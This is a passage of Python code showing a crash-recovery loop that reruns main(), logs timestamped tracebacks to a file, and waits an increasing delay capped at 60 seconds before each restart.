        try:
            restart_count += 1
            if restart_count > 1:
                print(f"Restarting main() (attempt #{restart_count})...")
            main()
            break  # Normal exit (should never reach here since main() has infinite loop)
        except KeyboardInterrupt:
            print("Keyboard interrupt detected, exiting...")
            break
        except (Exception, SystemExit) as e:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            tb = traceback.format_exc()
            error_text = f"[{timestamp}] Fatal error in __main__ (restart #{restart_count}): {e}\n{tb}"
            print(error_text)
            log_error_to_file(error_text)
            
            # Exponential backoff: 10s, 30s, 60s, then stay at 60s
            sleep_time = min(10 * restart_count, 60)
            print(f"Restarting in {sleep_time} seconds...")
            safe_sleep(sleep_time)